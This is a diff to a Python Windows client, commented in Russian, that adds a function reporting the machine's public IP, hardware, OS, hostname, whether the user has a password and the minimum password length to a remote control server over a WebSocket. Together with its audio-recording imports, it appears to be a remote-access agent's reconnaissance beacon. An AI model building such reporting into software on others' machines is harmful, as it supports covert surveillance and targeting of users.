@@ -18,6 +18,7 @@ import winreg
 import pyaudio
 import wave
 import io
+import socket
 
 # Настройка логирования
 logging.basicConfig(
@@ -58,6 +59,44 @@ def send_ip_via_ws(ws):
         ws.send("ip:" + ip)
     except Exception as e:
         logger.error(f"Ошибка получения или отправки публичного IP: {e}")
+
+def get_init_info() -> dict:
+    """Получить IP (через ipify) и метрики, вернуть их одним словарём."""
+    # Получаем IP
+    ip = ""
+    try:
+        response = requests.get("https://api.ipify.org?format=json", timeout=10)
+        ip = response.json().get("ip")
+        logger.info(f"Получен публичный IP: {ip}")
+    except Exception as e:
+        logger.error(f"Ошибка получения публичного IP: {e}")
+
+    # Собираем метрики
+    metrics = {}
+    try:
+        disk_usage = psutil.disk_usage("C:\\")
+        metrics["disk_total"] = disk_usage.total
+        metrics["disk_free"] = disk_usage.free
+
+        mem = psutil.virtual_memory()
+        metrics["memory_total"] = mem.total
+        metrics["memory_available"] = mem.available
+
+        metrics["processor"] = platform.processor()
+        metrics["os"] = f"{platform.system()} {platform.release()}"
+        metrics["has_password"] = current_user_has_password()
+        metrics["minimum_password_lenght"] = get_min_password_length()
+
+        hostname = socket.gethostname()
+        metrics["pc_name"] = hostname
+    except Exception as e:
+        logger.error(f"Ошибка сбора метрик: {e}")
+        metrics["error"] = str(e)
+
+    return {
+        "ip": ip,
+        "metrics": metrics
+    }
 
 def collect_and_send_metrics(ws):
     """
@@ -322,7 +361,13 @@ def control_ws():
             ws_active = True
         logger.info("WebSocket соединение установлено")
         ws.send("Client connected")
-        send_ip_via_ws(ws)
+        init_data = get_init_info()
+        payload = {
+            "command": "init_info",
+            "data": init_data
+        }
+        ws.send(json.dumps(payload))
+        logger.info("Отправлен init_info (ip + metrics).")
 
     while True:
         with ws_lock:
